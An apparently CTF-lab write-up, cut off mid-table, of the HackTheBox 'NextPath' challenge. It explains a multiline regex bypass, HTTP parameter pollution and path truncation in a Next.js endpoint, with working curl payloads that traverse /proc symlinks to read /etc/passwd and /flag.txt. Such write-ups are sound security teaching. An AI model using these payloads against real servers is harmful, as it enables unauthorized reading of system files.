<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NextPath â€” HTB CTF Writeup | Abdelaaziz Belkhair</title>
    <meta name="description"
        content="HTB CTF Writeup: NextPath â€” Chaining multiline regex, HTTP parameter pollution, and path truncation for arbitrary file read on Next.js.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link
        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
        integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
        crossorigin="anonymous" referrerpolicy="no-referrer">
    <style>
        :root {
            --primary: #00d4ff;
            --accent: #ff6b6b;
            --success: #00ff88;
            --bg: #0a0a0a;
            --bg-card: #111111;
            --bg-terminal: #0d0d0d;
            --text: #e4e4e7;
            --text-secondary: #a1a1aa;
            --text-muted: #71717a;
            --border: #27272a;
            --orange: #f97316;
            --purple: #a78bfa;
        }

        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg);
            color: var(--text);
            line-height: 1.8;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 0 24px;
        }

        a {
            color: var(--primary);
            text-decoration: none;
            transition: color 0.2s;
        }

        a:hover {
            color: var(--success);
        }

        /* â”€â”€ Header â”€â”€ */
        header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 100;
            background: rgba(10, 10, 10, 0.95);
            backdrop-filter: blur(12px);
            border-bottom: 1px solid var(--border);
        }

        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 24px;
            max-width: 1100px;
            margin: 0 auto;
        }

        .logo {
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.25rem;
            font-weight: 700;
            color: var(--primary);
        }

        .nav-links {
            display: flex;
            gap: 1.75rem;
            list-style: none;
        }

        .nav-links a {
            color: var(--text-secondary);
            font-weight: 500;
        }

        .nav-links a:hover {
            color: var(--primary);
        }

        main {
            padding-top: 100px;
            padding-bottom: 60px;
        }

        .back-link {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            color: var(--text-secondary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            margin-bottom: 1.5rem;
        }

        .back-link:hover {
            color: var(--primary);
        }

        /* â”€â”€ Challenge Card (HTB-style) â”€â”€ */
        .challenge-card {
            background: linear-gradient(135deg, rgba(249, 115, 22, 0.08) 0%, rgba(0, 212, 255, 0.04) 100%);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 2rem 2.5rem;
            margin-bottom: 2rem;
            position: relative;
            overflow: hidden;
        }

        .challenge-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--orange), var(--primary), var(--purple));
        }

        .challenge-card::after {
            content: '';
            position: absolute;
            top: -60px;
            right: -60px;
            width: 180px;
            height: 180px;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(249, 115, 22, 0.08) 0%, transparent 70%);
            pointer-events: none;
        }

        .challenge-platform {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            color: var(--success);
            background: rgba(0, 255, 136, 0.1);
            padding: 0.3rem 0.75rem;
            border-radius: 20px;
            margin-bottom: 1rem;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }

        .challenge-title {
            font-size: 2.2rem;
            font-weight: 700;
            line-height: 1.2;
            margin-bottom: 0.5rem;
            background: linear-gradient(135deg, var(--text) 0%, var(--text-secondary) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .challenge-subtitle {
            color: var(--text-secondary);
            font-size: 1.05rem;
            margin-bottom: 1.5rem;
            max-width: 650px;
        }

        .challenge-meta {
            display: flex;
            gap: 0.6rem;
            flex-wrap: wrap;
            margin-bottom: 1.5rem;
        }

        .meta-badge {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.7rem;
            padding: 0.3rem 0.7rem;
            border-radius: 6px;
            text-transform: uppercase;
            letter-spacing: 0.3px;
            font-weight: 600;
        }

        .meta-badge.date {
            color: var(--primary);
            background: rgba(0, 212, 255, 0.12);
        }

        .meta-badge.category {
            color: var(--purple);
            background: rgba(167, 139, 250, 0.12);
        }

        .meta-badge.tag {
            color: var(--orange);
            background: rgba(249, 115, 22, 0.12);
        }

        .challenge-stats {
            display: flex;
            gap: 1px;
            background: var(--border);
            border-radius: 12px;
            overflow: hidden;
            margin-top: 0.5rem;
        }

        .stat-item {
            flex: 1;
            padding: 1rem;
            text-align: center;
            background: var(--bg-card);
        }

        .stat-item:first-child {
            border-radius: 12px 0 0 12px;
        }

        .stat-item:last-child {
            border-radius: 0 12px 12px 0;
        }

        .stat-value {
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.3rem;
            font-weight: 700;
            display: block;
        }

        .stat-value.difficulty-medium {
            color: var(--orange);
        }

        .stat-value.difficulty-hard {
            color: var(--accent);
        }

        .stat-value.difficulty-easy {
            color: var(--success);
        }

        .stat-value.impact {
            color: var(--accent);
        }

        .stat-value.vulns {
            color: var(--primary);
        }

        .stat-label {
            font-size: 0.7rem;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-top: 0.25rem;
        }

        /* â”€â”€ Table of Contents â”€â”€ */
        .toc {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 1.25rem 1.5rem;
            margin-bottom: 2rem;
        }

        .toc-title {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 0.75rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .toc-title::before {
            content: '';
            width: 12px;
            height: 2px;
            background: var(--orange);
        }

        .toc ol {
            list-style: none;
            counter-reset: toc-counter;
            padding: 0;
            margin: 0;
        }

        .toc li {
            counter-increment: toc-counter;
            margin-bottom: 0.25rem;
        }

        .toc li a {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            color: var(--text-secondary);
            font-size: 0.85rem;
            padding: 0.35rem 0.5rem;
            border-radius: 6px;
            transition: all 0.15s;
        }

        .toc li a:hover {
            color: var(--orange);
            background: rgba(249, 115, 22, 0.06);
        }

        .toc li a::before {
            content: counter(toc-counter, decimal-leading-zero);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.7rem;
            color: var(--text-muted);
            min-width: 20px;
        }

        /* â”€â”€ Article Content â”€â”€ */
        .article-content h2 {
            font-size: 1.35rem;
            margin: 2.5rem 0 1rem;
            color: var(--text);
            padding-bottom: 0.6rem;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }

        .article-content h2::before {
            content: '';
            width: 4px;
            height: 22px;
            background: var(--orange);
            border-radius: 2px;
            flex-shrink: 0;
        }

        .article-content h3 {
            font-size: 1.1rem;
            margin: 1.5rem 0 0.75rem;
            color: var(--text);
        }

        .article-content h4 {
            font-size: 0.95rem;
            margin: 1.25rem 0 0.5rem;
            color: var(--text-secondary);
        }

        .article-content p {
            margin-bottom: 1rem;
            color: var(--text-secondary);
        }

        .article-content ul,
        .article-content ol {
            margin: 1rem 0;
            padding-left: 1.5rem;
            color: var(--text-secondary);
        }

        .article-content li {
            margin-bottom: 0.5rem;
        }

        /* â”€â”€ Code Blocks â”€â”€ */
        .article-content pre {
            background: var(--bg-terminal);
            border: 1px solid var(--border);
            border-radius: 10px;
            padding: 1.25rem 1.25rem 1.25rem;
            overflow-x: auto;
            margin: 1.5rem 0;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.8rem;
            line-height: 1.6;
            position: relative;
        }

        .article-content pre::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, var(--orange) 0%, transparent 100%);
            border-radius: 10px 10px 0 0;
        }

        .article-content code {
            font-family: 'JetBrains Mono', monospace;
            background: rgba(249, 115, 22, 0.1);
            padding: 0.15rem 0.45rem;
            border-radius: 4px;
            font-size: 0.83em;
            color: var(--orange);
        }

        .article-content pre code {
            background: none;
            padding: 0;
            color: var(--text-secondary);
        }

        /* â”€â”€ Info & Warning Boxes â”€â”€ */
        .info-box {
            background: rgba(0, 212, 255, 0.06);
            border: 1px solid rgba(0, 212, 255, 0.15);
            border-left: 3px solid var(--primary);
            padding: 1.25rem 1.5rem;
            border-radius: 0 10px 10px 0;
            margin: 1.5rem 0;
            color: var(--text-secondary);
            font-size: 0.9rem;
        }

        .warning-box {
            background: rgba(255, 107, 107, 0.06);
            border: 1px solid rgba(255, 107, 107, 0.15);
            border-left: 3px solid var(--accent);
            padding: 1.25rem 1.5rem;
            border-radius: 0 10px 10px 0;
            margin: 1.5rem 0;
            color: var(--text-secondary);
            font-size: 0.9rem;
        }

        /* â”€â”€ Tables â”€â”€ */
        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            margin: 1.5rem 0;
            font-size: 0.85rem;
            border-radius: 10px;
            overflow: hidden;
            border: 1px solid var(--border);
        }

        th,
        td {
            padding: 0.7rem 1rem;
            text-align: left;
        }

        th {
            background: var(--bg-terminal);
            color: var(--primary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.78rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.3px;
            border-bottom: 1px solid var(--border);
        }

        td {
            color: var(--text-secondary);
            border-bottom: 1px solid rgba(39, 39, 42, 0.5);
        }

        tr:last-child td {
            border-bottom: none;
        }

        tr:hover td {
            background: rgba(249, 115, 22, 0.03);
        }

        td code {
            font-size: 0.8em;
        }

        hr {
            border: none;
            border-top: 1px solid var(--border);
            margin: 2rem 0;
        }

        /* â”€â”€ Pwned Banner â”€â”€ */
        .pwned-banner {
            text-align: center;
            padding: 2.5rem 2rem;
            margin: 3rem 0 1rem;
            background: linear-gradient(135deg, rgba(0, 255, 136, 0.06) 0%, rgba(0, 212, 255, 0.04) 100%);
            border: 1px solid rgba(0, 255, 136, 0.2);
            border-radius: 16px;
            position: relative;
        }

        .pwned-banner::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--success), var(--primary));
        }

        .pwned-icon {
            font-size: 2.5rem;
            margin-bottom: 0.75rem;
            display: block;
        }

        .pwned-text {
            font-family: 'JetBrains Mono', monospace;
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--success);
            text-transform: uppercase;
            letter-spacing: 3px;
        }

        .pwned-sub {
            color: var(--text-muted);
            font-size: 0.85rem;
            margin-top: 0.5rem;
        }

        /* â”€â”€ Footer â”€â”€ */
        footer {
            padding: 1.5rem 0;
            border-top: 1px solid var(--border);
            text-align: center;
        }

        footer p {
            color: var(--text-muted);
            font-size: 0.8rem;
        }

        /* â”€â”€ Responsive â”€â”€ */
        @media (max-width: 768px) {
            .nav-links {
                display: none;
            }

            .challenge-title {
                font-size: 1.6rem;
            }

            .challenge-card {
                padding: 1.5rem;
            }

            .challenge-stats {
                flex-wrap: wrap;
            }

            .stat-item {
                min-width: 80px;
            }

            table {
                font-size: 0.75rem;
            }

            th,
            td {
                padding: 0.4rem 0.6rem;
            }

            .toc {
                display: none;
            }
        }
    </style>
</head>

<body>
    <header>
        <nav>
            <a href="../index.html" class="logo">AB_</a>
            <ul class="nav-links">
                <li><a href="../index.html">Accueil</a></li>
                <li><a href="../blog.html">Blog</a></li>
                <li><a href="../writeups.html">Writeups</a></li>
                <li><a href="../index.html#contact">Contact</a></li>
            </ul>
        </nav>
    </header>

    <main class="container">
        <a href="../writeups.html" class="back-link"><i class="fas fa-arrow-left"></i> Retour aux writeups</a>

        <article>
            <div class="challenge-card">
                <span class="challenge-platform"><i class="fas fa-flag"></i> HackTheBox CTF</span>
                <h1 class="challenge-title">NextPath</h1>
                <p class="challenge-subtitle">Chaining multiline regex bypass, HTTP parameter pollution, and path truncation for arbitrary file read on Next.js.</p>
                <div class="challenge-meta">
                    <span class="meta-badge date"><i class="fas fa-calendar"></i> 2026-02-14</span>
                    <span class="meta-badge category">Web Exploitation</span>
                    <span class="meta-badge tag">Path Traversal</span>
                    <span class="meta-badge tag">HPP</span>
                    <span class="meta-badge tag">Regex Bypass</span>
                </div>
                <div class="challenge-stats">
                    <div class="stat-item">
                        <span class="stat-value difficulty-hard">Mediumâ€“Hard</span>
                        <span class="stat-label">Difficulty</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-value vulns">4</span>
                        <span class="stat-label">Bypasses</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-value impact">AFR</span>
                        <span class="stat-label">Impact</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-value difficulty-medium">Next.js</span>
                        <span class="stat-label">Stack</span>
                    </div>
                </div>
            </div>

            <nav class="toc">
                <div class="toc-title">Table of Contents</div>
                <ol>
                    <li><a href="#s1">Reconnaissance â€” Source Code Analysis</a></li>
                    <li><a href="#s2">Vulnerability Identification</a></li>
                    <li><a href="#s3">Proof of Concept â€” /etc/passwd</a></li>
                    <li><a href="#s4">The /flag.txt Problem â€” Modular Arithmetic</a></li>
                    <li><a href="#s5">The Solution â€” /proc/thread-self/root</a></li>
                    <li><a href="#s6">Full Attack Chain Summary</a></li>
                    <li><a href="#s7">Remediation</a></li>
                </ol>
            </nav>

            <div class="article-content">

                <div class="info-box">
                    <strong>Challenge</strong>: NextPath<br>
                    <strong>Category</strong>: Web Exploitation<br>
                    <strong>Difficulty</strong>: Mediumâ€“Hard<br>
                    <strong>Flag</strong>: <code>HTB{REDACTED}</code><br>
                    <strong>Target</strong>: <code>http://154.57.164.80:32580</code>
                </div>

                <h2 id="s1">1. Reconnaissance â€” Source Code Analysis</h2>

                <p>The challenge provides a <strong>Next.js</strong> application with a single API endpoint at
                    <code>/api/team</code>. Examining the source code:
                </p>

                <pre><code>// pages/api/team.js
import path from 'path';
import fs from 'fs';

const ID_REGEX = /^[0-9]+$/m;

export default function handler({ query }, res) {
  if (!query.id) {
    res.status(400).end("Missing id parameter");
    return;
  }

  // Check format
  if (!ID_REGEX.test(query.id)) {
    console.error("Invalid format:", query.id);
    res.status(400).end("Invalid format");
    return;
  }

  // Prevent directory traversal
  if (query.id.includes("/") || query.id.includes("..")) {
    console.error("DIRECTORY TRAVERSAL DETECTED:", query.id);
    res.status(400).end("DIRECTORY TRAVERSAL DETECTED?!? This incident will be reported.");
    return;
  }

  try {
    const filepath = path.join("team", query.id + ".png");
    const content = fs.readFileSync(filepath.slice(0, 100));

    res.setHeader("Content-Type", "image/png");
    res.status(200).end(content);
  } catch (e) {
    console.error("Not Found", e.toString());
    res.status(404).end(e.toString());
  }
}</code></pre>

                <p>The <code>Dockerfile</code> confirms the flag location and the runtime user:</p>

                <pre><code>FROM node:18-alpine
WORKDIR /app
COPY app/package*.json ./
RUN npm install
COPY app/ .
RUN npm run build

COPY flag.txt /flag.txt       # â† Flag is at /flag.txt

ENV NODE_ENV production
ENV PORT 1337
EXPOSE 1337
USER node                     # â† Process runs as non-root "node" user
CMD ["npm", "start"]</code></pre>

                <p><strong>Objective</strong>: Read <code>/flag.txt</code> from the filesystem through the
                    <code>/api/team</code> endpoint.
                </p>

                <h2 id="s2">2. Vulnerability Identification â€” Three Security Flaws</h2>

                <p>The handler has <strong>three</strong> distinct bugs that chain together into a full arbitrary file
                    read.</p>

                <h3>Flaw 1: Multiline Regex (<code>/m</code> flag)</h3>

                <pre><code>const ID_REGEX = /^[0-9]+$/m;</code></pre>

                <p>The <code>m</code> (multiline) flag changes how <code>^</code> and <code>$</code> behave:</p>

                <table>
                    <thead>
                        <tr>
                            <th>Without <code>m</code></th>
                            <th>With <code>m</code></th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>^</code> = start of <strong>entire string</strong></td>
                            <td><code>^</code> = start of <strong>any line</strong></td>
                        </tr>
                        <tr>
                            <td><code>$</code> = end of <strong>entire string</strong></td>
                            <td><code>$</code> = end of <strong>any line</strong></td>
                        </tr>
                    </tbody>
                </table>

                <p>If the input contains a newline (<code>\n</code>), the regex only needs <strong>one line</strong> to
                    be entirely digits to return <code>true</code>. Everything on other lines is completely unchecked.
                </p>

                <p><strong>Example</strong>: Input = <code>1337\nmalicious_payload</code></p>
                <ul>
                    <li>Line 1: <code>1337</code> â†’ matches <code>^[0-9]+$</code> âœ“</li>
                    <li>Line 2: <code>malicious_payload</code> â†’ never checked</li>
                </ul>

                <p><strong>Fix would have been</strong>: Remove the <code>m</code> flag â†’ <code>/^[0-9]+$/</code></p>

                <h3>Flaw 2: <code>.includes()</code> on Arrays (HTTP Parameter Pollution)</h3>

                <pre><code>if (query.id.includes("/") || query.id.includes("..")) {</code></pre>

                <p>In <strong>Next.js</strong>, duplicate query parameters create an <strong>array</strong>:</p>

                <pre><code>?id=1337&amp;id=evil â†’ query.id = ["1337", "evil"]</code></pre>

                <p>The critical issue: <code>Array.prototype.includes()</code> checks if any <strong>element</strong> of
                    the array <strong>strictly equals</strong> the search value. It does <strong>NOT</strong> search
                    inside the string elements.</p>

                <pre><code>// String behavior (what the developer expected):
"../../etc/passwd".includes("/")   // â†’ true âœ“ (catches traversal)

// Array behavior (what actually happens):
["1337\n", "../../etc/passwd"].includes("/")   // â†’ false âœ— (no element === "/")
["1337\n", "../../etc/passwd"].includes("..")  // â†’ false âœ— (no element === "..")</code></pre>

                <p>Neither array element is the single character <code>"/"</code> or the two-character string
                    <code>".."</code>, so the traversal check is completely bypassed.
                </p>

                <p><strong>Fix would have been</strong>: Reject arrays, or check each element individually with
                    <code>String.includes()</code>.
                </p>

                <h3>Flaw 3: Truncation Removes the <code>.png</code> Extension</h3>

                <pre><code>const filepath = path.join("team", query.id + ".png");
const content = fs.readFileSync(filepath.slice(0, 100));</code></pre>

                <p>When <code>query.id</code> is an array, <code>query.id + ".png"</code> triggers JavaScript's implicit
                    conversion:</p>

                <pre><code>["1337\n", "../../../../etc/passwd"] + ".png"
// Array.toString() joins with comma:
// â†’ "1337\n,../../../../etc/passwd.png"</code></pre>

                <p>Then <code>path.join("team", ...)</code> normalizes the path, and <code>filepath.slice(0, 100)</code>
                    truncates to 100 characters. If the path is crafted so that <code>/etc/passwd</code> ends at exactly
                    character 100, the <code>.png</code> extension (characters 101â€“104) is <strong>cleanly
                        amputated</strong>.</p>

                <h2 id="s3">3. Proof of Concept â€” Reading <code>/etc/passwd</code></h2>

                <h3>Payload</h3>

                <pre><code>curl -v "http://154.57.164.80:32580/api/team?id=1337%0a&amp;id=../../../../proc/self/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/etc/passwd"</code></pre>

                <h3>How It Works Step by Step</h3>

                <h4>Step 1: Array Creation</h4>

                <p>Two <code>id</code> parameters â†’
                    <code>query.id = ["1337\n", "../../../../proc/self/root/.../etc/passwd"]</code>
                </p>

                <h4>Step 2: Regex Bypass</h4>

                <p><code>ID_REGEX.test(["1337\n", "..."])</code> coerces the array to string:
                    <code>"1337\n,../../../../..."</code>. The <code>m</code> flag finds <code>1337</code> on line 1 â†’
                    <strong>passes</strong> âœ“
                </p>

                <h4>Step 3: Traversal Check Bypass</h4>

                <pre><code>["1337\n", "../../../../..."].includes("/")   // false â€” no element === "/"
["1337\n", "../../../../..."].includes("..")  // false â€” no element === ".."</code></pre>

                <p><strong>Bypassed</strong> âœ“</p>

                <h4>Step 4: Path Construction &amp; Normalization</h4>

                <pre><code>path.join("team", "1337\n,../../../../proc/self/root/.../etc/passwd.png")</code></pre>

                <p><code>path.join</code> normalizes <code>..</code> segments using a stack:</p>

                <table>
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Segment</th>
                            <th>Stack (after)</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>1</td>
                            <td><code>team</code></td>
                            <td><code>[team]</code></td>
                        </tr>
                        <tr>
                            <td>2</td>
                            <td><code>1337\n,..</code></td>
                            <td><code>[team, 1337\n,..]</code> â† literal name, NOT <code>..</code></td>
                        </tr>
                        <tr>
                            <td>3</td>
                            <td><code>..</code></td>
                            <td><code>[team]</code> â† pops <code>1337\n,..</code></td>
                        </tr>
                        <tr>
                            <td>4</td>
                            <td><code>..</code></td>
                            <td><code>[]</code> â† pops <code>team</code></td>
                        </tr>
                        <tr>
                            <td>5</td>
                            <td><code>..</code></td>
                            <td><code>[..]</code> â† nothing to pop, stays</td>
                        </tr>
                        <tr>
                            <td>6+</td>
                            <td><code>proc/self/root/...</code></td>
                            <td>pushed normally</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box">
                    <strong>Key detail</strong>: The first <code>..</code> from <code>../../../../</code> gets glued to
                    <code>1337\n,</code> via the comma from <code>Array.toString()</code>, forming the literal directory
                    name <code>1337\n,..</code>. This means only <strong>3 of the 4</strong> <code>../</code> actually
                    act as traversals. One <code>..</code> survives as the prefix.
                </div>

                <p><strong>Normalized path</strong>:</p>
                <pre><code>../proc/self/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/etc/passwd.png</code></pre>

                <h4>Step 5: Truncation</h4>

                <table>
                    <thead>
                        <tr>
                            <th>Segment</th>
                            <th>Chars</th>
                            <th>Running Total</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>..</code></td>
                            <td>2</td>
                            <td><strong>2</strong></td>
                        </tr>
                        <tr>
                            <td><code>/proc/self/root</code></td>
                            <td>15</td>
                            <td><strong>17</strong></td>
                        </tr>
                        <tr>
                            <td><code>/proc/1/root</code> Ã—1</td>
                            <td>12</td>
                            <td><strong>29</strong></td>
                        </tr>
                        <tr>
                            <td><code>/proc/1/root</code> Ã—2</td>
                            <td>12</td>
                            <td><strong>41</strong></td>
                        </tr>
                        <tr>
                            <td><code>/proc/1/root</code> Ã—3</td>
                            <td>12</td>
                            <td><strong>53</strong></td>
                        </tr>
                        <tr>
                            <td><code>/proc/1/root</code> Ã—4</td>
                            <td>12</td>
                            <td><strong>65</strong></td>
                        </tr>
                        <tr>
                            <td><code>/proc/1/root</code> Ã—5</td>
                            <td>12</td>
                            <td><strong>77</strong></td>
                        </tr>
                        <tr>
                            <td><code>/proc/1/root</code> Ã—6</td>
                            <td>12</td>
                            <td><strong>89</strong></td>
                        </tr>
                        <tr>
                            <td><code>/etc</code></td>
                            <td>4</td>
                            <td><strong>93</strong></td>
                        </tr>
                        <tr>
                            <td><code>/passwd</code></td>
                            <td>7</td>
                            <td><strong>100</strong> â† ğŸ¯</td>
                        </tr>
                        <tr>
                            <td><code>.png</code></td>
                            <td>4</td>
                            <td>104 â† <strong>truncated</strong></td>
                        </tr>
                    </tbody>
                </table>

                <p><code>filepath.slice(0, 100)</code> produces:</p>
                <pre><code>../proc/self/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/etc/passwd</code></pre>

                <h4>Step 6: Filesystem Resolution</h4>

                <p>The OS resolves the path from CWD <code>/app</code>:</p>

                <ol>
                    <li><code>..</code> â†’ <code>/</code> (up from <code>/app</code>)</li>
                    <li><code>proc/self/root</code> â†’ <code>/proc/self/root</code> â†’ <strong>symlink to
                            <code>/</code></strong></li>
                    <li>Each <code>proc/1/root</code> â†’ <code>/proc/1/root</code> â†’ <strong>symlink to
                            <code>/</code></strong></li>
                    <li><code>etc/passwd</code> â†’ <code>/etc/passwd</code> âœ“</li>
                </ol>

                <div class="info-box">
                    <strong>Why <code>/proc/self/root</code> and <code>/proc/1/root</code> resolve to
                        <code>/</code></strong>: These are kernel-maintained symlinks in procfs.
                    <code>/proc/self/root</code> points to the root filesystem of the current process, and
                    <code>/proc/1/root</code> points to PID 1's root filesystem. In a standard container, both resolve
                    to <code>/</code>. Crucially, <code>path.normalize</code> doesn't know about symlinks â€” it treats
                    <code>proc/self/root</code> as three literal directory names. Only the OS resolves the symlinks at
                    read time.
                </div>

                <p><strong>Result</strong>: <code>/etc/passwd</code> is read successfully âœ“</p>

                <h2 id="s4">4. The <code>/flag.txt</code> Problem â€” Modular Arithmetic Lock</h2>

                <p>Attempting the same technique for <code>/flag.txt</code> hits a mathematical wall.</p>

                <h3>The Constraint</h3>

                <p>The path structure after normalization is:</p>

                <pre><code>[prefix] + [symlink padding] + [target] = 100 characters
  ..         /proc/X/root       /flag.txt
  2 chars    must be 89          9 chars</code></pre>

                <p>Padding must equal <strong>89</strong>. But the available padding blocks are:</p>

                <table>
                    <thead>
                        <tr>
                            <th>Symlink</th>
                            <th>Chars</th>
                            <th>mod 3</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>/proc/1/root</code></td>
                            <td>12</td>
                            <td>0</td>
                        </tr>
                        <tr>
                            <td><code>/proc/self/root</code></td>
                            <td>15</td>
                            <td>0</td>
                        </tr>
                    </tbody>
                </table>

                <p>Any combination of 12 and 15 is <strong>always divisible by 3</strong>.</p>

                <p><strong>89 mod 3 = 2</strong> â†’ No combination of 12s and 15s can ever equal 89.</p>

                <p>This is provable: <code>12a + 15b = 3(4a + 5b)</code>, which is always a multiple of 3. Since 89 is
                    not a multiple of 3, it's <strong>mathematically impossible</strong>.</p>

                <h3>Why <code>/etc/passwd</code> Worked</h3>

                <pre><code>/etc/passwd = 11 chars â†’ padding = 100 - 2 - 11 = 87
87 mod 3 = 0 âœ“ â†’ 87 = 15 + 12Ã—6 = 15 + 72</code></pre>

                <h3>Proof of Failure</h3>

                <p>Testing the closest approximation:</p>

                <pre><code>curl -s "http://154.57.164.80:32580/api/team?id=1337%0a&amp;id=../../../../proc/self/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/proc/1/root/flag.txt"</code></pre>

                <p><strong>Error</strong>: <code>open '../.../proc/1/root/flag.txt.p'</code></p>

                <p>The <code>.p</code> (first character of <code>.png</code>) leaks through â€” the path is <strong>98
                        chars</strong>, 2 short. The truncation catches <code>flag.txt.p</code> instead of clean
                    <code>flag.txt</code>.
                </p>

                <h3>Failed Alternatives</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Attempt</th>
                            <th>Target Path</th>
                            <th>Length</th>
                            <th>mod 3</th>
                            <th>Result</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>/flag</code></td>
                            <td>5</td>
                            <td>2 âœ“</td>
                            <td></td>
                            <td>ENOENT â€” file doesn't exist</td>
                        </tr>
                        <tr>
                            <td><code>/root/flag.txt</code></td>
                            <td>14</td>
                            <td>2 âœ“</td>
                            <td></td>
                            <td>EACCES â€” <code>/root/</code> is mode 700</td>
                        </tr>
                        <tr>
                            <td><code>/home/flag.txt</code></td>
                            <td>14</td>
                            <td>2 âœ“</td>
                            <td></td>
                            <td>ENOENT â€” doesn't exist</td>
                        </tr>
                        <tr>
                            <td><code>/proc/1/cwd/flag.txt</code></td>
                            <td>20</td>
                            <td>2 âœ“</td>
                            <td></td>
                            <td>ENOENT â€” CWD is <code>/app</code>, not <code>/</code></td>
                        </tr>
                    </tbody>
                </table>

                <h2 id="s5">5. The Solution â€” <code>/proc/thread-self/root</code></h2>

                <h3>Discovery</h3>

                <p>Linux kernel 3.17+ introduced <code>/proc/thread-self</code>, a per-thread equivalent of
                    <code>/proc/self</code>:
                </p>

                <pre><code>/proc/self        â†’  /proc/&lt;pid&gt;             (process-level)
/proc/thread-self â†’  /proc/&lt;pid&gt;/task/&lt;tid&gt;   (thread-level)</code></pre>

                <p>For single-threaded processes (Node.js main thread), <code>/proc/thread-self/root</code> resolves to
                    the same place as <code>/proc/self/root</code> â†’ the root filesystem <code>/</code>.</p>

                <h3>Why It Breaks the Lock</h3>

                <pre><code>/proc/thread-self/root = 22 characters â†’ 22 mod 3 = 1</code></pre>

                <p>Now we have <strong>three different mod-3 residues</strong>:</p>

                <table>
                    <thead>
                        <tr>
                            <th>Symlink</th>
                            <th>Chars</th>
                            <th>mod 3</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>/proc/1/root</code></td>
                            <td>12</td>
                            <td><strong>0</strong></td>
                        </tr>
                        <tr>
                            <td><code>/proc/self/root</code></td>
                            <td>15</td>
                            <td><strong>0</strong></td>
                        </tr>
                        <tr>
                            <td><code>/proc/thread-self/root</code></td>
                            <td>22</td>
                            <td><strong>1</strong></td>
                        </tr>
                    </tbody>
                </table>

                <p>With 0 and 1 available as mod-3 residues, we can construct <strong>any</strong> sufficiently large
                    integer.</p>

                <h3>The Math</h3>

                <p>We need: <code>22a + 15b + 12c = 89</code></p>

                <p>Setting <code>a = 2</code>: <code>89 - 44 = 45</code><br>
                    Setting <code>b = 3</code>: <code>45 - 45 = 0</code> âœ“</p>

                <p><strong>Solution</strong>: 2Ã— <code>/proc/thread-self/root</code> + 3Ã— <code>/proc/self/root</code> =
                    <code>44 + 45 = 89</code> âœ“
                </p>

                <h3>Final Payload</h3>

                <pre><code>curl -s "http://154.57.164.80:32580/api/team?id=1337%0a&amp;id=../../../../proc/thread-self/root/proc/thread-self/root/proc/self/root/proc/self/root/proc/self/root/flag.txt"</code></pre>

                <h3>Character Count Verification</h3>

                <p>Normalized path:</p>
                <pre><code>../proc/thread-self/root/proc/thread-self/root/proc/self/root/proc/self/root/proc/self/root/flag.txt</code></pre>

                <table>
                    <thead>
                        <tr>
